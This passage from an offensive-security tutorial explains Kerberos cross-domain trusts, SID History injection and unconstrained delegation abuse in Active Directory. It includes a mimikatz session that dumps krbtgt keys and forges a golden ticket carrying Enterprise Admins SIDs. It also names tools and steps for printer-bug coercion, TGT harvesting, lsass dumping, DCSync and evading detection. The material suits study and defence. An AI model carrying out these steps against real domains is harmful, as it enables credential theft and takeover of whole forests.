<li>The KDC identifies that this service is in the trusting domain <code class="verbatim">bar.com</code>.
So the foo.com KDC <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/bac4dc69-352d-416c-a9f4-730b81ababb3">creates a TGT for bar.com</a> by using as encryption (and PAC
signing) key the <a href="#trust-key">inter-realm trust key</a> (a secret key shared between both
sides of a trust). Then, the KDC returns the <code class="verbatim">bar.com</code> TGT in the TGS-REP
message. The PAC included in <code class="verbatim">bar.com</code> TGT <a href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/#from-a-to-b-whats-in-a-pac">is a copy</a> of the <code class="verbatim">foo.com</code> TGT
PAC.</li>
<li>The client uses the <code class="verbatim">bar.com</code> TGT to ask for a HTTP\srvbar ST to the
<code class="verbatim">bar.com</code> KDC, by sending a TGS-REQ message.</li>
<li>The <code class="verbatim">bar.com</code> KDC checks the ticket by decrypting it with the inter-realm trust
key. Then it creates a ST for HTTP\srvbar for the client. When the new ST
is created, the PAC from the TGT is copied and <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280">filtered</a> if necessary. Usually,
extra SIDs that are not part of the forest of the trusted domain <a href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/#golden-tickets-and-sid-filtering">are removed</a>.</li>
<li>Finally, the client uses the ST to authenticate itself against the
HTTP\srvbar service.</li>
</ol>
<p>One thing that is curious is that, normally, the inter-realm TGTs are encrypted
using the RC4 algorithm instead of AES256.</p>
<div id="outline-container-sid-history-attack" class="outline-5">
<h5 id="sid-history-attack">
SID History attack
</h5>
<div id="outline-text-sid-history-attack" class="outline-text-5">
<p>
What it is interesting about this process is the way that the PAC is copied
between tickets on an inter-domain interaction. This behaviour can allow to an
attacker able to craft Golden Tickets for a domain
<a href="https://adsecurity.org/?p=1640">to compromise the entire forest</a>.</p>
<p>
As we seen before, the <a href="#pac">PAC</a> has a field to include extra <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/78eb9013-1c3a-4970-ad1f-2b1dad588a25">SIDs</a>, that identifies
special entities. This field is usually used to include those SIDs stored in the
<a href="https://docs.microsoft.com/es-es/windows/win32/adschema/a-sidhistory">SIDHistory</a> attribute.</p>
<p>
The SID History is used for migration purposes. When a user is migrated from a
domain to another, the privileges of the user are reset, a new SID is created,
the user is added to new groups, etc. However the SIDs from the groups the user
belongs in the old domain are stored in the SID History attribute. </p>
<p>
Then, when the user want to access to resources in the old domain, their history
SIDs are added to the PAC extra SIDs field. This way, the old domain can review
these SIDs and to grant the user their old privileges, allowing it to access the
old domain resources.</p>
<p>
However, the extra SIDs could be omitted (not copied into ST PAC) based on the
<a href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/">SID filtering</a> policy. Generally, the <strong>domains allows the SIDs from other domains
in the forest</strong> (by default), but <strong>discard extra SIDs from external forests</strong>
following the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280">ForestSpecific</a> rule, since the forest is the security boundary of
Active Directory. </p>
<p>
Additionally, <strong>domains of the same forest also can be quarantined</strong>, thus
removing the extra SIDs by applying the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280">QuarantinedWithinForest</a> policy.</p>
<p>
In contrast, the <a href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/#sid-filtering-relaxation">SID history can be enabled</a> in a trust between domains of
different forests with some limitations. The groups with SIDs of the target
(trusting) forest whose <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/f2ef15b6-1e9b-48b5-bf0b-019f061d41c8#gt_df3d0b61-56cd-4dac-9402-982f1fedc41c">RID</a> is higher than 1000 are allowed. Hence, the
administrative groups like "<a href="https://adsecurity.org/?p=3658">Domain Admins</a>" (RID = 512) whose RID lower than 1000
are filtered, but groups with a higher RID that belongs to those administrative
groups (becoming also administrative groups), such as the Exchange
administrative groups.</p>
<p>
Then, if the SID History is edited, administrative privileges for other domains
could be injected. For example, if you inject the <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756898(v=ws.10)">Enterprise Admins</a> SID in a
user SID History, then the user could have administrative privileges in the
entire forest.</p>
<p>
The SID History attribute <a href="https://adsecurity.org/?p=1772">can be edited directly</a> in the Active Directory
database by using the <a href="https://book.hacktricks.xyz/windows/stealing-credentials/credentials-mimikatz#sid">mimikatz misc::addsid</a> command.</p>
<p>
However, as we said before, the SID History is copied to the PAC of the TGT, so
if we can craft a Golden Ticket, we can inject the History SIDs we want directly
into the PAC extra SIDs attribute. Then, when we use this "Golder" ticket, its
PAC is copied into the inter-realm TGT. Afterwards, when using this inter-realm
TGT to get a ST for a service in the external domain, if this domain is in the
same forest, the privileged SIDs could be copied into the ST PAC, thus granting
us the privileges that we have initially injected in the Golder ticket.</p>
<p>
An interesting SID to inject is the one of the "<a href="https://adsecurity.org/?p=3658">Enterprise Admins</a>", this group
only exists in the root domain of the forest and by default is added as member
of all "Domain Admins" groups of all domains in the forest. </p>
<p>
Actually, if you compromise the root forest of the domain and create a Golden
ticket that includes the "Enterprise Admins" group (which RID is 519 and is
included by default for impacket and mimikatz), you don't need to create a
Golder ticket with extra SIDs, since you already have permissions to control all
the forest, even the quarantined domains (cause there is no extra SIDs to
filter). Adding "Enterprise Admins" to the extra SIDs is only neccesary if you
compromise a non-root domain and you want to compromise another domain of the
forest, except the quarantined domains that filter the extra SIDs.</p>
<figure>
<div class="src src-cmd">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>PS C:\&gt; .\mimikatz.exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
</span></span><span style="display:flex;"><span> .## <span style="color:#ae81ff">^ </span>##.  <span style="color:#e6db74">"A La Vie, A L'Amour"</span> - (oe.eo)
</span></span><span style="display:flex;"><span> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
</span></span><span style="display:flex;"><span> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
</span></span><span style="display:flex;"><span> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
</span></span><span style="display:flex;"><span>  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mimikatz # sekurlsa::krbtgt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Current krbtgt: 5 credentials
</span></span><span style="display:flex;"><span>         * rc4_hmac_nt       : 1bf960a6af7703f75b1a2b04787c85fb
</span></span><span style="display:flex;"><span>         * rc4_hmac_old      : 1bf960a6af7703f75b1a2b04787c85fb
</span></span><span style="display:flex;"><span>         * rc4_md4           : 1bf960a6af7703f75b1a2b04787c85fb
</span></span><span style="display:flex;"><span>         * aes256_hmac       : 8603210037f738c50120dbe0f2259466fd4fdd1d58ec0cf9ace34eb990c705a3
</span></span><span style="display:flex;"><span>         * aes128_hmac       : 204be93d3c18326bf0e6675eb0a32202
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mimikatz # kerberos::golden /admin:Administrator /domain:it.poke.mon /sid:S-1-5-21-1913835218-2813970975-3434927454 /sids:S-1-5-21-4285720809-372211516-2297741651-519 /aes256:8603210037f738c50120dbe0f2259466fd4fdd1d58ec0cf9ace34eb990c705a3 /ptt /groups:512,520,572
</span></span><span style="display:flex;"><span>User      : Administrator
</span></span><span style="display:flex;"><span>Domain    : it.poke.mon (IT)
</span></span><span style="display:flex;"><span>SID       : S-1-5-21-1913835218-2813970975-3434927454
</span></span><span style="display:flex;"><span>User Id   : 500
</span></span><span style="display:flex;"><span>Groups Id : *512 520 572
</span></span><span style="display:flex;"><span>Extra SIDs: S-1-5-21-4285720809-372211516-2297741651-519 ;
</span></span><span style="display:flex;"><span>ServiceKey: 8603210037f738c50120dbe0f2259466fd4fdd1d58ec0cf9ace34eb990c705a3 - aes256_hmac
</span></span><span style="display:flex;"><span>Lifetime  : 5/13/2021 9:36:28 AM ; 5/11/2031 9:36:28 AM ; 5/11/2031 9:36:28 AM
</span></span><span style="display:flex;"><span>-&gt; Ticket : ** Pass The Ticket **
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> * PAC generated
</span></span><span style="display:flex;"><span> * PAC signed
</span></span><span style="display:flex;"><span> * EncTicketPart generated
</span></span><span style="display:flex;"><span> * EncTicketPart encrypted
</span></span><span style="display:flex;"><span> * KrbCred generated
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Golden ticket for 'Administrator @ it.poke.mon' successfully submitted for current session</span></span></code></pre></div>
</div>
<figcaption>
Pass-The-Ticket with Enterprise Admins in extra SIDs
</figcaption>
</figure>
<p>
However, to perform a <a href="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/">dcsync attack in other domain</a>, maybe using the "Enterprise
Domain Controllers" (S-1-5-9) and "Domain Controllers" (S-1-5-21-domain-516)
groups SIDs is more stealth, since DC are the ones that normally perform the
synchronization rutines used in dcsync.</p>
<p>
To create "Golder" Tickets, you can use the <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden--silver">mimikatz kerberos::golden</a> command or
the <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py">impacket ticketer.py</a> script, similar to golden ticket creation but adding
extra SIDs. If you can, use the AES256 key to avoing <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Mittal-Evading-MicrosoftATA-for-ActiveDirectory-Domination.pdf">being detected by solutions
like ATA</a>.</p>
</div>
</div>
<div id="outline-container-inter-realm-tgt" class="outline-5">
<h5 id="inter-realm-tgt">
Inter-realm TGT
</h5>
<div id="outline-text-inter-realm-tgt" class="outline-text-5">
<p>
As we have seen, the use of Kerberos for inter-realm operations introduces a new
kind of TGT, the inter-realm TGT. This TGT is exactly like a normal one, except
that it is encrypted with the inter-realm trust key, which is a secret key that
allows to both sides of a trust to comunicate between them. The secret key is
stored as the key of an <a href="#trust-accounts">user account that represents the trust</a>.</p>
<p>
In order to get the inter-realm trust key, usually you need <a href="#domain-database-dumping">to dump the domain
database</a>. Moreover, there is one situation when you could get the trust-key
<a href="https://blog.xpnsec.com/inter-realm-key-roasting/">through Kerberoast</a>.</p>
<p>
When a trust is created, the password can be choosen by a person, so
there is the possibility that a weak password is set. Then, you can get a
inter-realm TGT encrypted with the trust key and try to crack then to get the
trust password (which is used to generate all the Kerberos trust keys). But
remember that trust password, as well as machine passwords, are usually changed
each 30 days.</p>
<p>
Finally, once you get the trust key, to <a href="https://adsecurity.org/?p=1588">create a inter-realm ticket</a>, you can use
the <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden--silver">mimikatz kerberos::golden</a> command or the <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py">impacket ticketer.py</a> script. Then
you can use it as any ticket. The inter-trust tickets are encrypted with the RC4
key, that is, the NT hash of the trust account.</p>
</div>
</div>
</div>
</div>
<div id="outline-container-kerberos-delegation" class="outline-4">
<h4 id="kerberos-delegation">
Kerberos Delegation
</h4>
<div id="outline-text-kerberos-delegation" class="outline-text-4">
<p>
As we have seem, Kerberos allows users to authenticate and access service all
over the domain, or even in other domains. However, sometimes the accessed
<a href="https://en.hackndo.com/constrained-unconstrained-delegation/#delegation-principle">services needs to impersonate the user</a> in order to talk with a third service.</p>
<p>
For example, a web server where the user is logged (with Kerberos) needs to
perform some activities in a database on behalf the user. However, when the user
authenticates against the web server, this only receives user ST for itself, but
to impersonate the user, it also requires a user ST for the database service.</p>
<p>
To handle this situation, Kerberos Delegation can be used. This feature provides
mechanisms to allow a service to get a ST for a third service on behalf of the
client.</p>
<p>
To perform Kerberos Delegation in Active Directory, there are two approaches: </p>
<dl>
<dt>
Unconstrained Delegation
</dt>
<dd>Implies to send the user TGT inside the ST to the
service, allowing it to totally impersonate the client against the KDC,
by using the client TGT.</dd>
<dt>
Constrained Delegation
</dt>
<dd>Provides mechanisms, the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94">Service for User</a> (S4U)
extensions, that allow a service to request a ST on behalf of an user
without need to use the client TGT, and only for a certain allowed
services.</dd>
</dl>
<p>Let's talk about <a href="https://www.tarlogic.com/en/blog/kerberos-iii-how-does-delegation-work/">how Kerberos delegation works</a>. But first, lets review the
anti-delegation measures that prevents the delegation from working.</p>
<div id="outline-container-kerberos-anti-delegation-measures" class="outline-5">
<h5 id="kerberos-anti-delegation-measures">
Kerberos Anti Delegation Measures
</h5>
<div id="outline-text-kerberos-anti-delegation-measures" class="outline-text-5">
<p>
There are two mechanism available to avoid that an specific user account can be
delegated (impersonated in Kerberos): </p>
<ul>
<li>Setting the NOT_DELEGATED flag in the <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties">UserAccountControl</a> attribute of the user
account.</li>
<li>Adding the user to the <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn466518(v=ws.11)">Protected Users</a> group.</li>
</ul>
<p>In any of this measures are applied to an user account, the delegation won't
be possible. Therefore it is important to know what accounts are protected, and
to locate them you can use a LDAP query with the following filter:</p>
<figure>
<div class="src src-ldap">
<pre tabindex="0"><code class="language-ldap" data-lang="ldap">(|
  (memberof:1.2.840.113556.1.4.1941:=CN=Protected Users,CN=Users,DC=&lt;domain&gt;,DC=&lt;dom&gt;)
  (userAccountControl:1.2.840.113556.1.4.803:=1048576)
)</code></pre>
</div>
<figcaption>
LDAP filter to retrieve accounts protected against delegation
</figcaption>
</figure>
<p>
In order to find delegation protected accounts you can use tools like <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1">Powerview</a>,
the <a href="https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps">Powershell ActiveDirectory module</a> or <a href="https://linux.die.net/man/1/ldapsearch">ldapsearch</a>.</p>
</div>
</div>
<div id="outline-container-kerberos-unconstrained-delegation" class="outline-5">
<h5 id="kerberos-unconstrained-delegation">
Kerberos Unconstrained Delegation
</h5>
<div id="outline-text-kerberos-unconstrained-delegation" class="outline-text-5">
<p>
In <a href="https://adsecurity.org/?p=1667">Kerberos Unconstrained Delegation</a> the service can impersonate the client user
since this sends its own TGT to the service. Then, the service can use the user
TGT (without any constrain) to ask for new STs for other services in behalf of
the client.</p>
<p>
The KDC set the <a href="https://tools.ietf.org/html/rfc4120#section-2.8">OK-AS-DELEGATE</a> flag in the ST for any service whose owner, the
service user, has the <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties">UserAccountControl</a> TRUSTED_FOR_DELEGATION flag set. By
checking the <a href="https://tools.ietf.org/html/rfc4120#section-2.8">OK-AS-DELEGATE</a> and the <a href="https://tools.ietf.org/html/rfc4120#section-2.6">FORWARDABLE</a> flags a client knows if it
should ask for a TGT to be sent to the target service in order to allow
unconstrained delegation. </p>
<p>
In the case of clients that are members of <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn466518(v=ws.11)">Protected Users</a> group or has the
<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties">UserAccountControl</a> NOT_DELEGATED flag set, then the <a href="https://tools.ietf.org/html/rfc4120#section-2.6">FORWARDABLE</a> flag is unset
in the ST.</p>
<p>
Moreover, to set the TRUSTED_FOR_DELEGATION flag in a user account, the
<a href="https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/">SeEnableDelegationPrivilege</a> is required.</p>
<p>
Let's view an example:</p>
<figure>
<pre class="example">                                    KDC (DC)
 .-----------1) TGS-REQ-------------&gt; .---. &lt;--------6) TGS-REQ-------------.
 |         + SPN: HTTP/websrv        /   /|     + SPN: MSSQLSvc/dbsrv       |
 |         + TGT client             .---. |     + TGT client - FORWARDED    |
 |                                  |   | '                                 |
 |  .--------2) TGS-REP-----------&lt; |   |/ &gt;--------7) TGS-REP-----------.  |
 |  |  + ST client &gt; HTTP/websrv    '---'   + ST client &gt; MSSQLSvc/dbsrv |  |
 |  |    - OK-AS-DELEGATE           ^   v                                |  |
 |  |    - FORWARDABLE              |   |                                |  |
 ^  v                               |   |                                |  |
  _____                             |   |                                |  |
 |     | &gt;-----3) TGS-REP-----------'   |                                |  |
 |_____|  + SPN: krbtgt/domain.local    |                                |  |
 /:::::/  + TGT client                  |                                |  |
 ------                                 |                                |  |
 client  &lt;-----4) TGS-REP---------------'                                |  |
   v        + TGT client - FORWARDED                                     v  ^
   |                                                                    .---.
   |                                                                   /   /|
   |                                                                  .---. |
   '----------------------------5) AP-REQ---------------------------&gt; |   | '
                          + ST client &gt; HTTP\websrv                   |   |/
                          + TGT client - FORWARDED                    '---'
                                                                      websrv
                                                                       v
                                  .---.                                |
                                 /   /|                                |
                                .---. | &lt;--------8) AP-REQ-------------'
                                |   | '   + ST client &gt; MSSQLSvc\dbsrv
                                |   |/
                                '---'
                                dbsrv
</pre>
<figcaption>
Unconstrained delegation process
</figcaption>
</figure>
<ol>
<li>The client request a ST for the service HTTP\websrv (a web service in the
websrv server), by using its TGT. The HTTP\websrv service belongs to the user
websrv$ (remember that usernames of [[#computer-accounts][computer accounts]] end with =$=).</li>
<li>The KDC checks that the <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties">TRUSTED_FOR_DELEGATION</a> flag is set for
websrv$. Hence, the KDC returns to the client a ST for HTTP\websrv that
has the <a href="https://tools.ietf.org/html/rfc4120#section-2.8">OK-AS-DELEGATE</a> flag (and <a href="https://tools.ietf.org/html/rfc4120#section-2.6">FORWARDABLE</a>). </li>
<li>The client checks the <a href="https://tools.ietf.org/html/rfc4120#section-2.8">OK-AS-DELEGATE</a> flag, that indicates that the service
uses delegation, so it decides to ask to KDC for a <a href="https://tools.ietf.org/html/rfc4120#section-2.6">FORWARDED</a> TGT to send to
the service.</li>
<li>The KDC returns a TGT with the FORWARDED flag set.</li>
<li>The client sends the ST with the FORWARDED TGT included to websrv to get
access to the HTTP\websrv service.</li>
<li>Ocasionally, the HTTP\websrv needs to impersonate the client to access to the
database service located in dbsrv. So the web service requests a ST for
MSSQLSvc\dbsrv on behalf of the client, by using the received client TGT.</li>
<li>The KDC then returns a ST for the client to access the MSSQLSvc\dbsrv
service.</li>
<li>Finally, the HTTP\websrv service uses the ST to access to MSSQLSvc\dbsrv by
impersonating the client.</li>
</ol>
<p>Probably the most important fact to have in mind is that a any ST that will be
send to HTTP\websrv will contain a TGT from the client. Therefore, if someone
compromises the websrv server, it will be able to get all those TGTs and use
them to impersonate any of the clients through a <a href="#pass-the-ticket">Pass the Ticket</a> attack.</p>
<p>
To retrieve the tickets from a Windows machine (including the delegated TGTs)
the <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#tickets">mimikatz sekurlsa::tickets</a> command or <a href="https://github.com/GhostPack/Rubeus#dump">Rubeus dump</a> command, could be used.
Other approach is to dump the lsass process with tools like <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">procdump</a>, <a href="https://lolbas-project.github.io/#/dump">sqldumper
or others</a>, and extract the tickets offline with mimikatz or <a href="https://github.com/skelsec/pypykatz">pypykatz</a>.</p>
<p>
But remember that the TGTs are included in all STs for the services of the
account that has the <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties">UserAccountControl</a> TRUSTED_FOR_DELEGATION flag set.
Therefore in the previous example, where websrv$ computer account was the owner
of the HTTP\websrv service, any ST requested for any other service of websrv$,
like for example, CIFS\websrv (to access <a href="#shares">SMB shares</a>), will also contain the
client TGT.</p>
<p>
In order to identity accounts with unconstrained delegation you can use the
following LDAP filter: </p>
<div class="src src-ldap">
<pre tabindex="0"><code class="language-ldap" data-lang="ldap">(UserAccountControl:1.2.840.113556.1.4.803:=524288)</code></pre>
</div>
<p>
In order to find Unconstrained Delegation accounts, you can use tools like
<a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1">Powerview</a> , <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/findDelegation.py">impacket findDelegation.py</a> script, the <a href="https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps">Powershell ActiveDirectory
module</a> or <a href="https://linux.die.net/man/1/ldapsearch">ldapsearch</a>.</p>
<p>
Therefore, if you compromise a server whose account has unconstrained
delegation, then you can harvest the TGTs of all the clients that connect to it.
You can use several phising techniques to make that users connect to your server
like crafting files that connects to your compromise machine to get Kerberos
TGTs, similar to the techniques used to get <a href="#ntlm-hashes-cracking">NTLM hashes to crack</a>.</p>
<p>
Moreover you can obtain the TGT of a computer account by forcing it to
connect to you server with <a href="https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory/41">the printer bug</a>. The printer bug uses <a href="https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1#a2e6">an RPC call</a>
of the <a href="#rpc-over-smb">RPRN RPC interface</a> that allows to any "<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows">Authenticated Users</a>" to indicate
to the target computer a server to connect through SMB.</p>
<p>
To trigger the printer bug you can use the <a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a> tool or the <a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py">printerbug.py</a>
script. You must pass the hostname as argument for the target machine to use
Kerberos, if you provide the IP, then NTLM will be use for authentication and no
delegation will be performed. Moreover, you can scan for computers that have the
spool service enabled (by default it is) with the <a href="https://github.com/vletoux/SpoolerScanner">SpoolerScan.ps1</a> script.</p>
<p>
Besides, to monitor for the apparition of TGTs you can use the
<a href="https://github.com/GhostPack/Rubeus#monitor">Rubeus monitor</a> command.</p>
<p>
Additionally, it is also possible to <a href="https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/">recollect TGTs without touching the
compromised servers</a>.</p>
<p>
For this, we need to modify the SPNs of the unconstrained delegation account we
have compromised. The bad news is that we need the <a href="https://docs.microsoft.com/en-gb/windows/win32/adschema/r-validated-spn">Validated-SPN</a> permission to
do that, and by default is not granted to the own account. However, in the case
of computers accounts, they can add by default SPNs that matches with <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/28ca4eca-0e0b-4666-9175-a37ccb8edada?redirectedfrom=MSDN">theirs
hostnames</a>, which fortunately includes hostnames added to the
<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/f59801d8-7b65-495c-b853-fc9e47e606f4">msDS-AdditionalDnsHostName</a>, that can be modified by the account itself. Then we
can add as new hostname the hostname of our machine, and create thus SPNs that
points to our machine. We can do this with <a href="https://github.com/dirkjanm/krbrelayx/blob/master/addspn.py">addspn.py</a>. Also we can add SPNs with
the <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)">setspn</a> utility. </p>
<p>
In order to make a hostname to point to our machine we can create a <a href="https://blog.netspi.com/exploiting-adidns/">custom
ADIDNS record</a> by using <a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a> or <a href="https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py">dnstool.py</a>.</p>
<p>
Then, we can use the printer bug or phising techniques to make the users
authenticate against our server. Finally, to recollect the TGTs we can use
<a href="https://github.com/dirkjanm/krbrelayx">krbrelayx</a>.</p>
<p>
A very interesting case that allows to compromise the domain is to execute the
<a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation">printer bug against a DC</a> to make it to connect to our compromised server. This
way you can get a TGT for the DC account and using it to launch a <a href="https://adsecurity.org/?p=1729">DCSync attack</a>.</p>
<div id="outline-container-kerberos-unconstrained-delegation-across-forests" class="outline-6">
<h6 id="kerberos-unconstrained-delegation-across-forests">
Kerberos Unconstrained Delegation across forests
</h6>
<div id="outline-text-kerberos-unconstrained-delegation-across-forests" class="outline-text-6">
<p>
In fact, this technique can also be used <a href="https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/">across bidirectional forest trusts</a> that
have TGT delegation enabled, in order to compromise another forest. Usually, TGT
delegation used to be enabled by default, but <a href="https://support.microsoft.com/en-us/help/4490425/updates-to-tgt-delegation-across-incoming-trusts-in-windows-server">Microsoft issued a patch</a> that
makes that <strong>TGT delegation disabled by default</strong>.</p>
<p>
The following sequence described the Kerberos messages involved in the printer
bug attack across domains in case of TGT delegation being enabled. The attacker
sends a RPC call from barsrv to foosrv to indicate to this last one to connect
to udbarsrv, which has unconstrained delegation. Once done, a TGT of foosrv$
(the domain user of foosrv) can be obtained in udbarsrv.</p>
<p>
The steps are the following:</p>
<figure>
<pre class="example">                                 
   .--1) TGS-REQ----------------&gt;  .---. &lt;-------8) TGS-REQ----------------.
   |  + SPN: cifs/foosrv          /   /|   + SPN: cifs/udbarsrv            | 
   |                             .---. |   + TGT foosrv$ &gt; bar.com         |
   |                             |   | '                                   |
   | .------2) TGS-REP---------&lt; |   |/  &gt;-------9) TGS-REP--------------. |
   | | + TGT barsrv$ &gt; foo.com   '---'     + ST foosrv$ &gt; cifs/udbarsrv  | |
   | |                           KDC         - OK-AS-DELEGATE            | |
   | |                          bar.com                                  | |
   ^ v                                                                   | |
   .---.                                                                 | |
  /   /|  RpcRemoteFindFirstPrinterChangeNotification -&gt; udbarsrv        | |
 .---. | ---------5) AP-REQ -------------------------------------------. | |
 |   | '      + ST barsrv$ &gt; cifs/foosrv                               | | |
 |   |/                                                                | | |
 '---'                                                                 | | |
 barsrv      .---.                                                     | | |
 ^ v        /   /| &lt;-------12) AP-REQ--------------------.             | | |
 | |       .---. |     + ST foosrv$ &gt; cifs/udbarsrv      |             | | |
 | |       |   | '     + TGT foosrv$                     |             | | |
 | |       |   |/        - FORWARDED                     |             v v ^
 | |       '---'                                         '-----------&lt; .---.
 | |      udbarsrv                 .--6) TGS-REQ--------------------&lt; /   /|
 | |                               |  + SPN: cifs/udbarsrv           .---. |
 | |                               |                                 |   | '
 | |                               |  .----7) TGS-REP--------------&gt; |   |/ 
 | |                               |  |  + TGT foosrv$ &gt; bar.com     '---'  
 | |                               v  ^    - OK-AS-DELEGATE          foosrv
 | |                               .---.                              v ^
 | '-------3) TGS-REQ-----------&gt; /   /|                              | |
 |      + SPN: cifs/foosrv       .---. |&lt;-----10) TGS-REQ-------------' |
 |      + TGT barsrv$ &gt; foo.com  |   | '  + SPN: krbtgt/foo.com         |
 |                               |   |/                                 |
 '--------4) TGS-REP-----------&lt; '---'  &gt;-----11) TGS-REP---------------'
   + ST barsrv$ &gt; cifs/foosrv    KDC       + TGT foosrv$ 
                                 foo.com      - FORWARDED
</pre>
<figcaption>
Kerberos messages in printer bug across domains (delegation enabled)
</figcaption>
</figure>
<ol>
<li>barsrv (of the bar.com domain) sends a TGS-REQ to the <code class="verbatim">bar.com</code> KDC asking for
a ST for the SMB service (cifs) of foosrv (since the printer bug uses
<a href="#rpc-over-smb">RPC over SMB</a>).</li>
<li>The bar.com KDC checks that the requested service is in the trusting domain
<code class="verbatim">foo.com</code> and issues a TGT for barsrv$ for that domain.</li>
<li>Then barsrv uses its TGT for <code class="verbatim">foo.com</code> to ask to the <code class="verbatim">foo.com</code> KDC for a ST
for cifs/foosrv service.</li>
<li>The <code class="verbatim">foo.com</code> KDC returns then a ST for barsrv$ for cifs/foosrv.</li>
<li>Then barsrv authenticates against foosrv and performs the printer bug call,
<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b8b414d9-f1cd-4191-bb6b-87d09ab2fd83">RpcRemoteFindFirstPrinterChangeNotification</a>, indicating to foosrv (of
<code class="verbatim">foo.com</code> domain) to connect to udbarsrv server (of <code class="verbatim">bar.com</code> domain) by
using <a href="#rpc-over-smb">SMB</a>. </li>
<li>foosrv asks the <code class="verbatim">foo.com</code> KDC for a ST for the SMB service of udbarsrv
(cifs/udbarsrv).</li>
<li>The <code class="verbatim">foo.com</code> KDC checks that the requested service is in the trusting domain
<code class="verbatim">bar.com</code> and issues a TGT for foosrv$ for that domain. This TGT includes the
OK-AS-DELEGATE flag, that indicates that TGT delegation is enabled for
<code class="verbatim">bar.com</code> from <code class="verbatim">foo.com</code>.</li>
<li>Next, foosrv uses the new TGT to ask the <code class="verbatim">bar.com</code> KDC for a ST for
cifs/udbarsrv.</li>
<li>The <code class="verbatim">bar.com</code> KDC returns a ST for foosrv$ for cifs/udbarsrv. This ST has
the OK-AS-DELEGATE flag set, that indicates that the services uses
unconstrained delegation.</li>
<li>Thus, foosrv checks that cifs/udbarsrv uses delegation and the <code class="verbatim">bar.com</code>
delegation is allowed, so it asks to the <code class="verbatim">foo.com</code> KDC for a forwarded TGT.</li>
<li>The <code class="verbatim">foo.com</code> KDC returns a TGT for the user foosrv$ to the foosrv server.</li>
<li>Finally, the foosrv connects to udbarsrv and authenticates including its own
TGT. Now, an attacker in this machine can recollect the TGT and use it to
access to foosrv.</li>
</ol>
